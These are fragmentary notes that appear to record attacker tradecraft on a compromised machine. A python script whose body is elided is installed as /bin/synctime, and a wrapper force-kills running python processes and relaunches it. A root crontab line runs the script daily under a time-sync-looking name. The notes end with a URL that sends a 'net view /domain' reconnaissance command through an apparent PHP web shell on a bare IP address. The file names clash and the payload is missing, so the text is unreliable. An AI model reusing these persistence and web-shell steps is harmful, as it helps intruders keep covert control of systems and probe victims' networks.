/bin/synctime:

#!/usr/bin/env python

.....................

/bin/timeusync:

#!/bin/sh

kill -9 `pgrep python` > /dev/null 2>&1;/bin/synctime



vim /etc/crontab

36 23 * * * root /bin/timesync

//service cron status


view-source:http://114.6.45.106/conn1.php?cmd=net%20view%20/domain
